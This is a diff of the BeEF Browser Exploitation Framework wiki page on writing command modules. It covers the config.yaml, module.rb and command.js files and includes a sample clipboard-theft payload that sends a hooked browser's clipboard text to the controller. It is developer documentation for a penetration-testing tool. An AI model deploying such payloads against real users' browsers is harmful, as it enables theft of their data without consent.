@@ -1,32 +1,31 @@
 ## Introduction
 
-BeEF has been designed in a modular way so that it is very easy to create a new module and add it to BeEF.
+BeEF has been designed using modular development principles so that it is very easy to create and add new functionality with command modules.
 
-Basically, modules are all stored in the [module](https://github.com/beefproject/beef/tree/master/modules) directory and are composed of three main files :
-* **config.yaml** : The YAML configuration file which describe properties of the module
-* **module.rb**  which allow integrating the module in the BeEF web interface
-* **command.js** : the JavaScript "payload" which will be executed on the hooked browser
+Modules are all stored in the [beef/modules](https://github.com/beefproject/beef/tree/master/modules) directory and are composed of three main files:
+* **config.yaml** - configuration file describing the properties of a module
+* **module.rb** - enables integration of the module with the BeEF web interface
+* **command.js** -  the JavaScript "payload" which will be executed on the hooked browser
 
 #### Table of Contents
 
-* [YAML Configuration File](#yaml-configuration-file)
-* [Interface with Rails Web GUI](#interface-with-rails-web-gui)
-* [Javascript Payload](#javascript-payload)
+* [YAML Configuration File (config.yaml)](#yaml-configuration-file-configyaml)
+* [Web Interface Integration (module.rb)](#web-interface-integration-modulerb)
+* [Javascript Payload (command.js)](#javascript-payload-commandjs)
 * [Other Useful Examples](#other-useful-examples)
-* [What Now?](#what-now-)
+* [What Now?](#what-now)
+* [References](#references)
 
+## YAML Configuration File (config.yaml)
 
-
-## <a name="config"/>YAML Configuration file 
-
-The YAML configuration file embeds five pieces of information :
-* The name of the plugin
+The YAML configuration file embeds five pieces of information:
+* The name of the module
 * The name of the author
-* The description of the plugin
-* The category of the plugin
-* The browsers and OS that can be targeted or not
+* The description of the module
+* The category of the module
+* The compatible browsers and OS 
 
-For example, here is the config.yaml of the [detect_firebug](https://github.com/beefproject/beef/blob/master/modules/browser/detect_firebug/config.yaml) plugin:
+For example, here is the config.yaml of the [Detect Firebug](https://github.com/beefproject/beef/blob/master/modules/browser/detect_firebug/config.yaml) module:
 ```yaml
 beef:
     module:
@@ -41,9 +40,19 @@ beef:
                  not_working: ["All"]
 ```
 
-Regarding list of browser, three arrays can be defined : **working**, **not_working** or **user_notify**. Browsers are defined by their main letters : **"FF"**, **"O"**, **"C"**, **"S"**, **"IE"** or **"All"**.
+Three arrays are used to define browser compatibility: **working**, **not_working** or **user_notify**.
 
-It is possible to define versions exploitable by providing the minimum and maximum version of each browser. The [get_visited_url](https://github.com/beefproject/beef/blob/master/modules/browser/get_visited_urls/config.yaml) plugin is a good example :
+Browsers are abbreviated using main letters:
+* **"FF":** Firefox
+* **"O":** Opera
+* **"C":** Chrome
+* **"S":** Safari
+* **"IE":** Internet Explorer 
+* **"All":** All browsers
+
+It is possible to define a minimum and maximum version exploitable by providing for each browser.
+
+The [Get Visited URL](https://github.com/beefproject/beef/blob/master/modules/browser/get_visited_urls/config.yaml) module is a good example :
 ```yaml
 target:
     working:
@@ -65,19 +74,20 @@ target:
     not_working: ["All"]
 ```
 
-You can find more detailed information on [[this page|Command-Module-Config]].
+You can find more detailed information on command module config [[here|Command-Module-Config]].
 
-## <a name="modulerb"/>Interface with rails web GUI
+## Web Interface Integration (module.rb)
 
-Next, you need to write the _module.rb_ file which will allow to be included in the BeEF interface. Don't panic, you won't need to be a rails guru to write such a file, BeEF defined high level methods and objects to do this.
+Next, you need to write the _module.rb_ file which defines how the module will appear in the BeEF interface. Don't panic, you don't need to be a Ruby expert to create this file. BeEF has defined high level methods and objects to do this, so it's more like filling out a template.
 
 ### Basic Architecture
 
-Basically, your file will look like this :
-```ruby
-class Your_module < BeEF::Core::Command
+Start out by creating the file and using this template:
 
-    # This method allows defining the options proposed to the user in the interface
+```ruby
+class Your_module_name < BeEF::Core::Command
+
+    # This method defines the options proposed to the user in the web interface
     def self.options
     end
 
@@ -85,7 +95,7 @@ class Your_module < BeEF::Core::Command
     def pre_send
     end
 
-    # This method will be called when BeEF will receive an answer from the hooked browser
+    # This method will be called when BeEF receives an answer from the hooked browser
     def post_execute
     end
 end
@@ -93,7 +103,7 @@ end
 
 ### Defining Data Types
 
-The **self.options** method should return an array which defines data proposed to the user. Here is an example with different fields taken from existing modules :
+The **self.options** method should return an array which defines data proposed to the user. Here is an example with different fields taken from existing modules:
 
 ```ruby
   def self.options
@@ -133,7 +143,7 @@ More detailed information on data types can be found [[here|Form-Data-Types]].
 
 ### Save Returned Information
 
-It is possible to save information gathered by the script in the list of information on the hooked browser. This action should be done in the **post_execute** function, for example here is the source code of the [browser_fingerprint](https://github.com/beefproject/beef/blob/master/modules/browser/browser_fingerprinting/module.rb) plugin :
+It is possible to save information gathered by the script in the list of information on the hooked browser. This action should be done in the **post_execute** function, for example here is the source code of the [Browser Fingerprint](https://github.com/beefproject/beef/blob/master/modules/browser/browser_fingerprinting/module.rb) module:
 
 ```ruby
   def post_execute
@@ -147,23 +157,22 @@ It is possible to save information gathered by the script in the list of informa
   end
 ```
 
-* **@datastore** is a dictionary of information returned by the JavaScript payload
-* The function define a dictionary and save it with the **save** function.
+**@datastore** is a dictionary of information returned by the JavaScript payload
 
-## <a name="javascriptpayload"/>Javascript payload
+## Javascript Payload (command.js)
 
-The last mandatory file is the JavaScript payload **command.js**. The JavaScript payload should be included in a function called by **beef.execute**. Except that you can do anything you want here.
+The last mandatory file is `command.js` which contains the JavaScript payload. The payload should be included in a function called by **beef.execute**. Except that you can do anything you want here.
 
-The following command should be used to return information to the BeEF controller :
+The following command should be used to return information to the BeEF controller:
 ```erb
 beef.net.send("<%= @command_url %>", <%= @command_id %>, "data");
 ```
 
-The BeEF JavaScript API already includes a lot of interesting features and embed jQuery. You can see details on this API [[here|Javascript-API]]. If you think that some functions of your module may improve the global API, look the [[relevant section|Javascript-API#wiki-improve]].
+The BeEF JavaScript API already includes a lot of interesting features and embedded jQuery (see [[here|Javascript-API]]). 
 
-Here is an interesting example taken from [clipboard_theft](https://github.com/beefproject/beef/blob/master/modules/host/clipboard_theft/command.js) :
+Here is an interesting example taken from the [Clipboard Theft](https://github.com/beefproject/beef/blob/master/modules/host/clipboard_theft/command.js) module:
 
-```Javascript
+```javascript
 beef.execute(function() {
   if (clipboardData.getData("Text") !== null) {
     beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboardData.getData("Text"));
@@ -175,9 +184,9 @@ beef.execute(function() {
 
 ## Other Useful Examples
 
-### Bind an External Object to a Given URI
+### Bind an External Object to a Specified URI
 
-You can bind an external object to a defined URI in order to use it from the hooked browser :
+You can bind an external object to a defined URI in order to use it from the hooked browser:
 
 ```ruby
 class Your_module < BeEF::Core::Command
@@ -191,9 +200,9 @@ class Your_module < BeEF::Core::Command
 end
 ```
 
-### Bind a raw HTTP response to a given URI
+### Bind a Raw HTTP Response to a Specified URI
 
-You can bind a raw HTTP response (headers and body) to a given URI in order to use it from the hooked browser :
+You can bind a raw HTTP response (headers and body) to a defined URI in order to use it from the hooked browser:
 
 ```ruby
   def pre_send
@@ -203,7 +212,7 @@ You can bind a raw HTTP response (headers and body) to a given URI in order to u
 
 ### Use BeEF Configuration Information
 
-You can use information of the BeEF configuration in your module.rb :
+You can use information from the BeEF configuration in your `module.rb`:
 
 ```ruby
 class Your_module < BeEF::Core::Command
@@ -219,12 +228,14 @@ end
 
 ## What Now?
 
-If you think that your module can be useful to other people, join the BeEF community on GitHub, fork the beef repository, upload your module and create a new issue for proposing it. We like people with new ideas :).
+If you think that your module can be useful to other people, join the BeEF community on GitHub, fork the beef repository, upload your module and create a new issue for proposing it.
+
+We like people with new ideas! :)
 
 ## References
 
-* [[Reference Page on config.yaml file|Command-Module-Config]]
-* [[Reference Page on format type for module.rb file|Form-Data-Types]]
+* [`config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config)
+* [`module.rb` Form Data Types](https://github.com/beefproject/beef/wiki/Form-Data-Types)
 
 ***
 
